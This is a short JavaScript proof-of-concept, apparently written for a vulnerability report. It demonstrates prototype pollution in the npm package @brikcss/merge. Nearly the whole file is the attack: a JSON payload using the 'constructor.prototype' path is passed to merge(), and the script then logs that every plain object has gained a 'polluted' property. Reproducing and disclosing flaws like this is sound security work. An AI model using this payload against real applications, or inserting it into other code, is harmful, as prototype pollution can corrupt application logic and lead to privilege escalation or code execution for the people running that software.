const merge = require('@brikcss/merge');
let obj = {};
let malicious_payload = '{"constructor": {"prototype": {"polluted":"yes"}}}';
console.log({}.polluted);
merge({}, JSON.parse(malicious_payload));
console.log({}.polluted);